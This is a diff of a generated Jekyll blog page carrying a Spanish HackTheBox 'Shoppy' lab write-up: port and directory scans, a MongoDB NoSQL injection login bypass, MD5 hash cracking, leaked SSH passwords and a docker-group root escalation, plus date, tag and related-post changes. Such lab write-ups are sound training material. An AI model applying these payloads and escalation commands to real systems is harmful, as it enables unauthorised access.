@@ -83,7 +83,7 @@
 <meta name="twitter:site" content="@mortzelo" />
 <meta name="twitter:creator" content="@H4ckerLite" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-01-18T03:06:32+01:00","datePublished":"2023-01-13T17:00:00+01:00","description":"Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker. Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04 Initiating SYN Stealth Scan at 11:59 Scanning 10.10.11.180 [65535 ports] Discovered open port 80/tcp on 10.10.11.180 Discovered open port 22/tcp on 10.10.11.180 Discovered open port 9093/tcp on 10.10.11.180 Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports) Nmap scan report for 10.10.11.180 Host is up, received user-set (0.16s latency). Scanned at 2023-01-15 11:59:53 -04 for 16s Not shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 9093/tcp open copycat syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.180 shoppy.htb&quot; | tee -a /etc/hosts Ahora debemos ver una web con una cuenta regresiva, nada importante Enumeración Enumerando directorios con WFUZZ nos encontramos lo siguiente. Nota: Debes tener clonado el repositorio de SecList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://shoppy.htb/FUZZ Total requests: 220560 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000053: 200 25 L 62 W 1074 Ch &quot;login&quot; 000000016: 301 10 L 16 W 179 Ch &quot;images&quot; 000000291: 301 10 L 16 W 179 Ch &quot;assets&quot; 000000259: 302 0 L 4 W 28 Ch &quot;admin&quot; Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque. Login Shoppy Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble. Login Shoppy Podemos seguir probando tipicas SQL injection, pero al final ninguna funcionará. 1 2 3 4 &#39; &#39;-- - &#39; or &#39;1&#39;=&#39;1 &#39; or &#39;1&#39;=&#39;1&#39;-- - Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y este otro blog No SQl injection. Podemos probar admin&#39;||&#39;1==1 y poner cualquier contraseña: Bypass Login Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección. Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john 1 2 3 4 5 6 7 8 9 10 11 12 echo &quot;admin:23c6877d9e2b564ef8b32c3a23de27b2&quot; &gt; hashes echo &quot;josh:6ebcea65320589ca4f2f1ce039975995&quot; &gt;&gt; hashes ❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5 Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status remembermethisway (josh) 1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s fuckyooh21..*7¡Vamos! Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably Session completed Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode =============================================================== Found: mattermost.shoppy.htb (Status: 200) [Size: 3122] Progress: 52985 / 100001 (52.98%) Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts. Al entrar en el web nos encontramos con esto Login Mattermost Viendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos. Information leaked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ ssh jaeger@10.10.11.180 jaeger@10.10.11.180&#39;s password: Sh0ppyBest@pp! Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26 manpath: can&#39;t set the locale; make sure $LC_* and $LANG are correct jaeger@shoppy:~$ export TERM=xterm jaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable. Enumeración del sistema 1 2 3 4 5 6 7 8 9 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Sh0ppyBest@pp! Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager jaeger@shoppy:~$ Intentamos ejecutar el comando 1 2 3 4 5 jaeger@shoppy:~$ sudo -u deploy /home/deploy/passw* Welcome to Josh password manager! Please enter your master password: Password Access denied! This incident will be reported ! jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy Password-Manager 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ Podemos migrar al usuario Deploy . 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ su deploy Password: Deploying@pp! $ bash deploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) deploy@shoppy:/home/jaeger$ Escalada de privilegios Pertenecemos al grupo docker mirando GtfObins podemos ver que podemos abusar del grupo docker Ejecutamos el comando nos da una shell como root. 1 2 deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash root@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las flags respectivas para cada usuario. 1 2 3 4 5 root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66 root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67 root@3ea87a82734f:~#","headline":"Shoppy WriteUp","image":{"alt":"Shoppy WriteUp","url":"http://localhost:4000/assets/img/commons/shoppy-writeup/Shoppy.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/shoppy-writeup/"},"url":"http://localhost:4000/posts/shoppy-writeup/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-01-29T16:22:14+01:00","datePublished":"2023-01-13T17:00:00+01:00","description":"Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker. Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04 Initiating SYN Stealth Scan at 11:59 Scanning 10.10.11.180 [65535 ports] Discovered open port 80/tcp on 10.10.11.180 Discovered open port 22/tcp on 10.10.11.180 Discovered open port 9093/tcp on 10.10.11.180 Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports) Nmap scan report for 10.10.11.180 Host is up, received user-set (0.16s latency). Scanned at 2023-01-15 11:59:53 -04 for 16s Not shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 9093/tcp open copycat syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.180 shoppy.htb&quot; | tee -a /etc/hosts Ahora debemos ver una web con una cuenta regresiva, nada importante Enumeración Enumerando directorios con WFUZZ nos encontramos lo siguiente. Nota: Debes tener clonado el repositorio de SecList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://shoppy.htb/FUZZ Total requests: 220560 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000053: 200 25 L 62 W 1074 Ch &quot;login&quot; 000000016: 301 10 L 16 W 179 Ch &quot;images&quot; 000000291: 301 10 L 16 W 179 Ch &quot;assets&quot; 000000259: 302 0 L 4 W 28 Ch &quot;admin&quot; Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque. Login Shoppy Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble. Login Shoppy Podemos seguir probando tipicas SQL injection, pero al final ninguna funcionará. 1 2 3 4 &#39; &#39;-- - &#39; or &#39;1&#39;=&#39;1 &#39; or &#39;1&#39;=&#39;1&#39;-- - Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y este otro blog No SQl injection. Podemos probar admin&#39;||&#39;1==1 y poner cualquier contraseña: Bypass Login Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección. Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john 1 2 3 4 5 6 7 8 9 10 11 12 echo &quot;admin:23c6877d9e2b564ef8b32c3a23de27b2&quot; &gt; hashes echo &quot;josh:6ebcea65320589ca4f2f1ce039975995&quot; &gt;&gt; hashes ❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5 Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status remembermethisway (josh) 1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s fuckyooh21..*7¡Vamos! Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably Session completed Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode =============================================================== Found: mattermost.shoppy.htb (Status: 200) [Size: 3122] Progress: 52985 / 100001 (52.98%) Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts. Al entrar en el web nos encontramos con esto Login Mattermost Viendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos. Information leaked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ ssh jaeger@10.10.11.180 jaeger@10.10.11.180&#39;s password: Sh0ppyBest@pp! Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26 manpath: can&#39;t set the locale; make sure $LC_* and $LANG are correct jaeger@shoppy:~$ export TERM=xterm jaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable. Enumeración del sistema 1 2 3 4 5 6 7 8 9 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Sh0ppyBest@pp! Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager jaeger@shoppy:~$ Intentamos ejecutar el comando 1 2 3 4 5 jaeger@shoppy:~$ sudo -u deploy /home/deploy/passw* Welcome to Josh password manager! Please enter your master password: Password Access denied! This incident will be reported ! jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy Password-Manager 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ Podemos migrar al usuario Deploy . 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ su deploy Password: Deploying@pp! $ bash deploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) deploy@shoppy:/home/jaeger$ Escalada de privilegios Pertenecemos al grupo docker mirando GtfObins podemos ver que podemos abusar del grupo docker Ejecutamos el comando nos da una shell como root. 1 2 deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash root@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las flags respectivas para cada usuario. 1 2 3 4 5 root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66 root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67 root@3ea87a82734f:~#","headline":"Shoppy WriteUp","image":{"alt":"Shoppy WriteUp","url":"http://localhost:4000/assets/img/commons/shoppy-writeup/Shoppy.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/shoppy-writeup/"},"url":"http://localhost:4000/posts/shoppy-writeup/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -1320,10 +1320,10 @@
 
 
 <em class=""
-    data-ts="1674007592"
+    data-ts="1675005734"
     data-df="YYYY-MM-DD"
     data-toggle="tooltip" data-placement="bottom">
-  2023-01-17
+  2023-01-29
 </em>
 
     </span>
@@ -1883,6 +1883,16 @@ root@3ea87a82734f:~#
         
       <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
       
+        
+        
+        
+      <li><a href="/posts/ambassador-writeup/">Ambassador WriteUp</a></li>
+      
+        
+        
+        
+      <li><a href="/posts/precious-writeup/">Precious WriteUp</a></li>
+      
     </ul>
   </div> <!-- #access-lastmod -->
 
@@ -1924,37 +1934,6 @@ root@3ea87a82734f:~#
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
   
     
     
@@ -1974,6 +1953,58 @@ root@3ea87a82734f:~#
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -1984,13 +2015,6 @@ root@3ea87a82734f:~#
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
@@ -2000,48 +2024,6 @@ root@3ea87a82734f:~#
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
     
   
     
@@ -2072,11 +2054,227 @@ root@3ea87a82734f:~#
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
     
     
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2111,13 +2309,22 @@ root@3ea87a82734f:~#
       <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
     
       
+      <a class="post-tag" href="/tags/command-injection/">command injection</a>
+    
+      
       <a class="post-tag" href="/tags/directoty-transversal/">directoty transversal</a>
+    
+      
+      <a class="post-tag" href="/tags/easy/">easy</a>
     
       
       <a class="post-tag" href="/tags/grafana/">grafana</a>
     
       
       <a class="post-tag" href="/tags/no-sql/">no sql</a>
+    
+      
+      <a class="post-tag" href="/tags/path-hijacking/">path hijacking</a>
     
       
       <a class="post-tag" href="/tags/rce/">rce</a>
@@ -2204,7 +2411,33 @@ root@3ea87a82734f:~#
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
 
 
 
@@ -2214,23 +2447,6 @@ root@3ea87a82734f:~#
 <!-- Fill with the other newlest posts  -->
 
 
-
-  
-    
-    
-      
-      
-    
-  
-    
-    
-      
-      
-    
-  
-    
-    
-  
 
 
 
@@ -2269,7 +2485,8 @@ root@3ea87a82734f:~#
 
 
 
-                Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo Directory Transversal y Arbitrary File R...
+                Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un
+a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
               </p>
             </div>
           </div>
@@ -2313,6 +2530,47 @@ root@3ea87a82734f:~#
         </a>
       </div>
     
+      
+      
+      <div class="card">
+        <a href="/posts/photobomb-writeup/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em class="small"
+    data-ts="1675440000"
+    data-df="YYYY-MM-DD"
+    >
+  2023-02-03
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Photobomb WriteUp</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking
+
+Escaneo NMAP
+
+Antes de empezar les recomie...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
     </div> <!-- .card-deck -->
   </div> <!-- #related-posts -->
 
@@ -2325,10 +2583,10 @@ root@3ea87a82734f:~#
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <div class="btn btn-outline-primary disabled"
+  <a href="/posts/tty/" class="btn btn-outline-primary"
     prompt="Anterior">
-    <p>-</p>
-  </div>
+    <p>Tratamiento de la TTY</p>
+  </a>
   
 
   
@@ -2430,37 +2688,6 @@ root@3ea87a82734f:~#
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2480,6 +2707,58 @@ root@3ea87a82734f:~#
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -2490,13 +2769,6 @@ root@3ea87a82734f:~#
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
@@ -2506,48 +2778,6 @@ root@3ea87a82734f:~#
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
     
   
     
@@ -2578,11 +2808,227 @@ root@3ea87a82734f:~#
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
     
     
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2617,13 +3063,22 @@ root@3ea87a82734f:~#
       <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
     
       
+      <a class="post-tag" href="/tags/command-injection/">command injection</a>
+    
+      
       <a class="post-tag" href="/tags/directoty-transversal/">directoty transversal</a>
+    
+      
+      <a class="post-tag" href="/tags/easy/">easy</a>
     
       
       <a class="post-tag" href="/tags/grafana/">grafana</a>
     
       
       <a class="post-tag" href="/tags/no-sql/">no sql</a>
+    
+      
+      <a class="post-tag" href="/tags/path-hijacking/">path hijacking</a>
     
       
       <a class="post-tag" href="/tags/rce/">rce</a>
